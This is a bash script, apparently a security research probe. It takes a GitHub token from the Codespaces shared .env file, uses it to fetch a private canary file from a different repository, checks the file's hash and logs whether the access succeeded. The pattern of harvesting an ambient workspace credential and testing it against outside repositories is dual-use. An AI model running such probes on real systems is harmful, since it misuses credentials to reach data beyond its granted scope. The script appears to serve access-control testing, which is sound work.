#!/usr/bin/env bash
set -euo pipefail
set +x
umask 077

variant='external_fork'
target_repository='Per0x1de-1337/cs-additional-r2-20261107054424-dbf0d83cc0'
target_branch='fixture-read-20261107054424-dbf0d83cc0'
canary_path='private-canary-20261107054424-dbf0d83cc0.txt'
expected_sha256='0ee9ebcdf2444f333daca246820ab77c7c26f2fd7f4c424dcd31c96eebdad33f'
workspace_head_sha="$(git rev-parse HEAD 2>/dev/null || true)"
repository_environment="${GITHUB_REPOSITORY-}"
automatic_postcreate=false
test "${CODEX_ADDITIONAL_REPO_AUTOMATIC-}" = 1 && automatic_postcreate=true

if test -z "${GITHUB_TOKEN-}" && test -r /workspaces/.codespaces/shared/.env; then
  set -a
  # shellcheck disable=SC1091
  . /workspaces/.codespaces/shared/.env
  set +a
fi
runtime_token="${GITHUB_TOKEN-}"
unset GH_TOKEN GITHUB_TOKEN
probe_dir="$(mktemp -d)"
chmod 700 "$probe_dir"
trap 'rm -rf -- "$probe_dir"' EXIT

status=no_token
observed_sha256=""
hash_match=false
if test -n "$runtime_token"; then
  printf 'Authorization: Bearer %s\nAccept: application/vnd.github+json\nX-GitHub-Api-Version: 2022-11-28\n' "$runtime_token" >"$probe_dir/auth.headers"
  chmod 600 "$probe_dir/auth.headers"
  unset runtime_token
  status="$(curl -sS --connect-timeout 10 --max-time 45 -o "$probe_dir/response.json" -w '%{http_code}' \
    -H "@$probe_dir/auth.headers" \
    "https://api.github.com/repos/$target_repository/contents/$canary_path?ref=$target_branch" || printf 000)"
  rm -f -- "$probe_dir/auth.headers"
  if test "$status" = 200; then
    observed_sha256="$(jq -r '.content // empty' "$probe_dir/response.json" | tr -d '\n' | base64 -d | sha256sum | cut -d ' ' -f1)"
    test "$observed_sha256" = "$expected_sha256" && hash_match=true
  fi
fi
unset runtime_token

jq -n --arg variant "$variant" --argjson automatic "$automatic_postcreate" \
  --arg head "$workspace_head_sha" --arg repository "$repository_environment" \
  --arg target "$target_repository" --arg branch "$target_branch" --arg path "$canary_path" \
  --arg status "$status" --arg expected "$expected_sha256" --arg observed "$observed_sha256" \
  --argjson match "$hash_match" \
  '{probe_variant:$variant,automatic_postcreate:$automatic,source:{workspace_head_sha:$head,repository_environment:$repository},additional_repository:{target:$target,branch:$branch,canary_path:$path,http_status:$status,expected_sha256:$expected,observed_sha256:$observed,hash_match:$match},writes_attempted:false}' \
  > /tmp/codex-additional-repo-chain.json
chmod 600 /tmp/codex-additional-repo-chain.json
